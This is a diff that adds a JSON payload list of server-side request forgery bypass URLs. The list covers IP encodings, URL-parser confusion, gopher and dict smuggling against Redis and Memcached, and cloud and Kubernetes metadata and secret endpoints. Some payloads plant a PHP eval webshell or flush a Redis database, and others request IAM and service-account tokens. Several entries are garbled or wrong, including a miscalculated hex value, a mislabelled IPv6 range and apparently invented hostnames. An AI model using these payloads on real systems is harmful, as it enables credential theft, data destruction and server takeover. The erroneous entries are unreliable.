@@ -1,0 +1,135 @@
+{
+  "info": {
+    "name": "SSRF Bypass Techniques",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Advanced SSRF bypass techniques including IPv6, protocol smuggling, and URL parser confusion. 2026 updated.",
+    "category": "SSRF",
+    "severity": "CRITICAL",
+    "owasp": "A10:2021 - Server-Side Request Forgery"
+  },
+  "ipv6_bypass_techniques": [
+    {"url": "http://[::1]/", "description": "IPv6 loopback", "type": "ipv6", "risk": "HIGH"},
+    {"url": "http://[::ffff:127.0.0.1]/", "description": "IPv4-mapped IPv6 localhost", "type": "ipv6", "risk": "HIGH"},
+    {"url": "http://[::ffff:169.254.169.254]/", "description": "IPv4-mapped AWS metadata", "type": "ipv6", "risk": "CRITICAL"},
+    {"url": "http://[0:0:0:0:0:ffff:169.254.169.254]/", "description": "Full IPv4-mapped AWS", "type": "ipv6", "risk": "CRITICAL"},
+    {"url": "http://[2001:db8::1]/", "description": "IPv6 unique local", "type": "ipv6", "risk": "MEDIUM"},
+    {"url": "http://[fe80::1]/", "description": "IPv6 link-local", "type": "ipv6", "risk": "MEDIUM"},
+    {"url": "http://0000::1:80/", "description": "IPv6 compressed localhost", "type": "ipv6", "risk": "HIGH"},
+    {"url": "http://[::1%25lo]/", "description": "IPv6 with zone ID", "type": "ipv6", "risk": "HIGH"},
+    {"url": "http://[::ffff:0:0]/", "description": "IPv6 IPv4-mapped prefix", "type": "ipv6", "risk": "MEDIUM"},
+    {"url": "http://[2001:470:c:c::2]/", "description": "Tunnel broker IPv6", "type": "ipv6", "risk": "MEDIUM"}
+  ],
+  "ip_encoding_bypass": [
+    {"url": "http://2130706433/", "description": "Decimal IP localhost", "type": "encoding", "risk": "HIGH"},
+    {"url": "http://3232235777/", "description": "Decimal IP 192.168.1.1", "type": "encoding", "risk": "HIGH"},
+    {"url": "http://0x7f.0x1/", "description": "Hex IP localhost", "type": "encoding", "risk": "HIGH"},
+    {"url": "http://0x7f000001/", "description": "Hex IP 127.0.0.1", "type": "encoding", "risk": "HIGH"},
+    {"url": "http://0177.0000.0000.0001/", "description": "Octal IP localhost", "type": "encoding", "risk": "HIGH"},
+    {"url": "http://127.1/", "description": "Dotted decimal shorthand (127.1 = 127.0.0.1)", "type": "encoding", "risk": "HIGH"},
+    {"url": "http://127.1.1/", "description": "Shorthand 127.1.1 = 127.0.1.1", "type": "encoding", "risk": "MEDIUM"},
+    {"url": "http://1.1.1.1/", "description": "Shorthand 1.1.1.1", "type": "encoding", "risk": "LOW"},
+    {"url": "http://1/", "description": "Single number 1 = 0.0.0.1", "type": "encoding", "risk": "LOW"},
+    {"url": "http://0x01010101/", "description": "Hex calculation (169705473)", "type": "encoding", "risk": "HIGH"}
+  ],
+  "url_parsing_confusion": [
+    {"url": "http://127.0.0.1#@localhost/", "description": "Fragment auth bypass", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://localhost.@127.0.0.1/", "description": "At-symbol domain swap", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://127.0.0.1.127.0.0.1/", "description": "Dotted IP confusion", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://127.0.0.1%2e127.0.0.1/", "description": "Encoded dot confusion", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://127.0.0.1\\localhost/", "description": "Backslash confusion", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://localhost%00.attacker.com/", "description": "Null byte truncation", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://localhost%09.attacker.com/", "description": "Tab in URL", "type": "parser_confusion", "risk": "MEDIUM"},
+    {"url": "http://localhost%0a.attacker.com/", "description": "Newline in URL", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://127.0.0.1%E2%80%AE@attacker.com/", "description": "RTL override char", "type": "parser_confusion", "risk": "HIGH"},
+    {"url": "http://[::1]:80:443@localhost/", "description": "Port confusion IPv6", "type": "parser_confusion", "risk": "MEDIUM"},
+    {"url": "http://localhost%23attacker.com/", "description": "Encoded # in domain", "type": "parser_confusion", "risk": "MEDIUM"},
+    {"url": "http://127.0.0.1%E2%80%82/", "description": "IDN homograph bypass", "type": "parser_confusion", "risk": "HIGH"}
+  ],
+  "dns_tricks": [
+    {"url": "http://127.0.0.1.nip.io/", "description": "nip.io DNS trick", "type": "dns", "risk": "HIGH"},
+    {"url": "http://127.0.0.1.xip.io/", "description": "xip.io DNS trick", "type": "dns", "risk": "HIGH"},
+    {"url": "http://169.254.169.254.sslip.io/", "description": "sslip.io metadata IP", "type": "dns", "risk": "CRITICAL"},
+    {"url": "http://169.254.169.254.1尾猪piggybank/", "description": "DNS wildcard piggybank", "type": "dns", "risk": "CRITICAL"},
+    {"url": "http://a]@127.0.0.1:80@attacker.com/", "description": "Open redirect DNS trick", "type": "dns", "risk": "HIGH"},
+    {"url": "http://127.11.1.1/", "description": "Decimal confusion 127.1.1.1", "type": "dns", "risk": "MEDIUM"},
+    {"url": "http://123.123.123.123/", "description": "Multiplication trick", "type": "dns", "risk": "LOW"}
+  ],
+  "protocol_smuggling_v2": [
+    {"url": "dict://localhost:11211/stats", "description": "Memcached DICT protocol", "type": "protocol", "risk": "HIGH"},
+    {"url": "gopher://localhost:6379/_INFO", "description": "Redis Gopher INFO", "type": "protocol", "risk": "CRITICAL"},
+    {"url": "gopher://localhost:6379/_CONFIG GET *", "description": "Redis Gopher config", "type": "protocol", "risk": "CRITICAL"},
+    {"url": "gopher://localhost:6379/_FLUSHALL", "description": "Redis Gopher flush", "type": "protocol", "risk": "CRITICAL"},
+    {"url": "gopher://localhost:6379/_SET x \"<?php eval($_GET[0])?>\"", "description": "Redis Gopher PHP shell", "type": "protocol", "risk": "CRITICAL"},
+    {"url": "gopher://localhost:6379/_GET x", "description": "Redis Gopher get", "type": "protocol", "risk": "HIGH"},
+    {"url": "gopher://localhost:9200/_cluster/health", "description": "Elasticsearch Gopher", "type": "protocol", "risk": "HIGH"},
+    {"url": "gopher://localhost:27017/", "description": "MongoDB Gopher", "type": "protocol", "risk": "HIGH"},
+    {"url": "sftp://localhost:22/", "description": "SFTP protocol", "type": "protocol", "risk": "MEDIUM"},
+    {"url": "smb://localhost/", "description": "SMB protocol", "type": "protocol", "risk": "HIGH"},
+    {"url": "ldap://localhost:389/", "description": "LDAP protocol", "type": "protocol", "risk": "HIGH"},
+    {"url": "ftp://localhost/", "description": "FTP protocol (active)", "type": "protocol", "risk": "MEDIUM"},
+    {"url": "imap://localhost:143/", "description": "IMAP protocol", "type": "protocol", "risk": "MEDIUM"},
+    {"url": "pop3://localhost:110/", "description": "POP3 protocol", "type": "protocol", "risk": "MEDIUM"},
+    {"url": "telnet://localhost:23/", "description": "Telnet protocol", "type": "protocol", "risk": "HIGH"}
+  ],
+  "aws_specific_bypass": [
+    {"url": "http://169.254.169.254/latest/meta-data/", "description": "AWS metadata v1", "type": "aws", "risk": "CRITICAL"},
+    {"url": "http://169.254.169.254/latest/api/token", "description": "AWS IMDSv2 token endpoint", "type": "aws", "risk": "CRITICAL"},
+    {"url": "http://AWS169254/", "description": "AWS hostname bypass", "type": "aws", "risk": "HIGH"},
+    {"url": "http://AWS169254/latest/meta-data/", "description": "AWS hostname metadata", "type": "aws", "risk": "CRITICAL"},
+    {"url": "http://instance-data/", "description": "AWS instance-data hostname", "type": "aws", "risk": "CRITICAL"},
+    {"url": "http://metadata.tenancyoss.com/", "description": "Alt AWS metadata", "type": "aws", "risk": "HIGH"}
+  ],
+  "gcp_specific_bypass": [
+    {"url": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata root", "type": "gcp", "risk": "CRITICAL"},
+    {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "description": "GCP service account token", "type": "gcp", "risk": "CRITICAL"},
+    {"url": "http://100.100.100.200/latest/meta-data/", "description": "Alibaba metadata", "type": "gcp", "risk": "CRITICAL"},
+    {"url": "http://metadata.google.internal/", "description": "GCP short metadata", "type": "gcp", "risk": "HIGH"},
+    {"url": "http://metadata.google.internal/computeMetadata/v1beta/", "description": "GCP beta metadata", "type": "gcp", "risk": "HIGH"}
+  ],
+  "azure_specific_bypass": [
+    {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "description": "Azure metadata with header", "type": "azure", "risk": "CRITICAL", "note": "Requires Metadata: true header"},
+    {"url": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "description": "Azure compute metadata", "type": "azure", "risk": "CRITICAL"},
+    {"url": "http://169.254.169.254/metadata/identity/oauth2/token", "description": "Azure MI token", "type": "azure", "risk": "CRITICAL"},
+    {"url": "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01", "description": "Azure attested data", "type": "azure", "risk": "HIGH"}
+  ],
+  "oracle_bypass": [
+    {"url": "http://192.0.0.192/latest/", "description": "Oracle metadata root", "type": "oracle", "risk": "CRITICAL"},
+    {"url": "http://192.0.0.192/latest/instance-id", "description": "Oracle instance ID", "type": "oracle", "risk": "CRITICAL"},
+    {"url": "http://192.0.0.192/latest/userData", "description": "Oracle user data", "type": "oracle", "risk": "CRITICAL"}
+  ],
+  "digitalocean_bypass": [
+    {"url": "http://169.254.169.254/metadata/v1.json", "description": "DO metadata root", "type": "digitalocean", "risk": "CRITICAL"},
+    {"url": "http://169.254.169.254/metadata/v1/id", "description": "DO droplet ID", "type": "digitalocean", "risk": "HIGH"},
+    {"url": "http://169.254.169.254/metadata/v1/user-data", "description": "DO user data", "type": "digitalocean", "risk": "CRITICAL"}
+  ],
+  "kubernetes_bypass": [
+    {"url": "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets/", "description": "K8s secrets list", "type": "kubernetes", "risk": "CRITICAL"},
+    {"url": "http://kubernetes.default.svc/api/v1/secrets", "description": "K8s all secrets", "type": "kubernetes", "risk": "CRITICAL"},
+    {"url": "http://kubernetes.default.svc/api/v1/namespaces/default/pods", "description": "K8s pods list", "type": "kubernetes", "risk": "HIGH"},
+    {"url": "http://10.0.0.1/api/v1/nodes", "description": "K8s API direct IP", "type": "kubernetes", "risk": "CRITICAL"}
+  ],
+  "whitelist_bypass_patterns": [
+    {"url": "https://target.com@127.0.0.1/", "description": "Standard auth bypass", "type": "whitelist", "risk": "HIGH"},
+    {"url": "https://target.com%5c127.0.0.1/", "description": "Backslash in domain", "type": "whitelist", "risk": "HIGH"},
+    {"url": "https://target.com%00.attacker.com/", "description": "Null byte domain suffix", "type": "whitelist", "risk": "HIGH"},
+    {"url": "https://target.com.evil.com/", "description": "Domain suffix injection", "type": "whitelist", "risk": "HIGH"},
+    {"url": "https://target.com#@attacker.com/", "description": "Fragment auth to attacker", "type": "whitelist", "risk": "HIGH"},
+    {"url": "https://target%E2%80%A1.com/", "description": "IDN homograph", "type": "whitelist", "risk": "HIGH"}
+  ],
+  "parameter_contamination": [
+    {"url": "http://attacker.com?url=http://127.0.0.1", "description": "URL parameter override", "type": "contamination", "risk": "HIGH"},
+    {"url": "http://127.0.0.1&redirect=http://attacker.com", "description": "Parameter pollution", "type": "contamination", "risk": "HIGH"},
+    {"url": "http://example.com/http://127.0.0.1", "description": "Double URL scheme", "type": "contamination", "risk": "HIGH"},
+    {"url": "http://example.com/http:\\127.0.0.1", "description": "Backslash scheme", "type": "contamination", "risk": "HIGH"}
+  ],
+  "cloud_metadata_endpoints": {
+    "aws": ["169.254.169.254"],
+    "azure": ["169.254.169.254"],
+    "gcp": ["metadata.google.internal", "100.100.100.200"],
+    "oracle": ["192.0.0.192", "192.0.0.4"],
+    "digitalocean": ["169.254.169.254"],
+    "alibaba": ["100.100.100.200"],
+    "ibm": ["169.254.169.254", "10.254.254.254"]
+  }
+}
